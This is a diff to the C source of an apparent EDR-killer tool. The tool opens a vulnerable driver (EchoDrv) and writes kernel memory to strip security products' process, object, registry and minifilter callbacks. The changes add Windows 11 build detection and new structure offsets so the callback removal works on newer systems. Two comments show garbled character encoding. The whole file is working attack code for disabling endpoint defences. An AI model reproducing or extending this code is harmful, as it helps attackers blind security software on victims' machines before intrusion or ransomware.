@@ -2,6 +2,8 @@
 HANDLE hDevice = NULL;
 HANDLE Process = NULL;
 DWORD dwMajor = 0;
+DWORD dwMinorVersion = 0;
+DWORD dwBuild = 0;
 INT64 EDRIntance[500] = { 0 };
 BOOL LoadDriver() {
 	HKEY hKey;
@@ -97,7 +99,7 @@ VOID UnloadDrive() {
 	}
 }
 BOOL InitialDriver() {
-	//win7 加载此驱动崩溃，和后面代码逻辑无关
+	//win7 鍔犺浇姝ら┍鍔ㄥ穿婧冿紝鍜屽悗闈唬鐮侀�昏緫鏃犲叧
 	if (DriverType == 1) {
 		hDevice = CreateFile(L"\\\\.\\EchoDrv", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (hDevice == INVALID_HANDLE_VALUE) {
@@ -541,7 +543,7 @@ VOID RemoveObRegisterCallbacks(INT64 PsProcessTypeAddr, INT flag) {
 		CHAR* DriverName2 = GetDriverName(EDRPostOperation);
 		if (DriverName2 != NULL) {
 			if (IsEDR(DriverName2)) {
-				//清除回调
+				//娓呴櫎鍥炶皟
 				DriverWriteMemery(data, (VOID*)(Flink + 48), 8);
 				if (flag == 1) {
 					printf("Process PreOperation: %s [Clear]\n", DriverName2);
@@ -725,12 +727,17 @@ VOID RemoverInstanceCallback(INT64 FLT_FILTERAddr) {
 
 		for (INT i = 0; i < 50; i++) {
 			INT64 CallbackNodeData = 0;
-			DriverWriteMemery((VOID*)(FilterInstanceAddr + 0xa0 + i * 8), &CallbackNodeData, 8);
+			INT offset = 0;
+			if (dwMajor == 10 && dwBuild < 22000) offset = 0xa0;
+			else if (dwMajor == 10 && dwBuild >= 22000) offset = 0xa8;
+			else {
+				printf("Windows system version not supported yet.");
+				exit(0);
+			}
+			DriverWriteMemery((VOID*)(FilterInstanceAddr + offset + i * 8), &CallbackNodeData, 8);
 			if (CallbackNodeData != 0) {
-
 				printf("\t\t\t[%d] : 0x%I64x\t[Clear]\n", i, CallbackNodeData);
-				DriverWriteMemery(&data, (VOID*)(FilterInstanceAddr + 0xa0 + i * 8), 8);
-
+				DriverWriteMemery(&data, (VOID*)(FilterInstanceAddr + offset + i * 8), 8);
 			}
 
 		}
@@ -821,8 +828,18 @@ VOID ClearMiniFilterCallback() {
 		FLT_VOLUMESAddr -= 0x10;
 
 		printf("\tFLT_VOLUMES [%d]: %I64x\n", i, FLT_VOLUMESAddr);
-
-		INT64 VolumesCallback = FLT_VOLUMESAddr + 0x120;
+		INT64 VolumesCallback = 0;
+		if (dwMajor == 10 && dwBuild < 22000) { 
+			VolumesCallback = FLT_VOLUMESAddr + 0x120;
+		}
+		else if (dwMajor == 10 && dwBuild >= 22000) {
+			VolumesCallback = FLT_VOLUMESAddr + 0x130;
+		}
+		else {
+			printf("Windows system version not supported yet.");
+			return;
+		}
+		
 
 		for (INT j = 0; j < 50; j++) {
 
@@ -879,16 +896,20 @@ int main()
 	HINSTANCE hinst = LoadLibraryA("ntdll.dll");
 	if (hinst == NULL) return FALSE;
 	NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
-	proc(&dwMajor, NULL, NULL);
-
+	proc(&dwMajor, &dwMinorVersion, &dwBuild);
+	dwBuild &= 0xffff;
 	if (!InitialDriver()) return 0;
 
 	ClearThreeCallBack();
 	ClearObRegisterCallbacks();
 	ClearCmRegisterCallback();
-	if (dwMajor >= 10) {
-		ClearMiniFilterCallback(); //Not yet adapted to lower versions of windows
+	if (dwMajor == 10) {
+		ClearMiniFilterCallback();
 	}
+	else {
+		printf("Minifilter callback clear currently only supports win10 and win11.");
+	}
+	
 	UnloadDrive();
 	system("pause");
 }
